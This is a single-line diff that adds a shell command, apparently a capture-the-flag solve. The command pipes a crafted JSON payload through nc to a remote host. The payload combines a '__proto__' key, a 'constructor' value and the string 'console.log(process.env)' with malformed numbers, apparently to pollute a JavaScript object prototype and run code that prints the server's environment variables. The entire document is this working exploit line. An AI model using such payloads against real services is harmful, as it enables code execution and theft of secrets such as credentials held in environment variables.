@@ -1,0 +1,1 @@
+echo '{"a":1e-999,"b":-1e-999,"c":"NaN","d":"NaN","e":-1,"f":[],"g":null,"h":99999999e999,"i":3,"__proto__":"","y":"constructor","z":"console.log(process.env)"}' | nc flu.xxx 2071
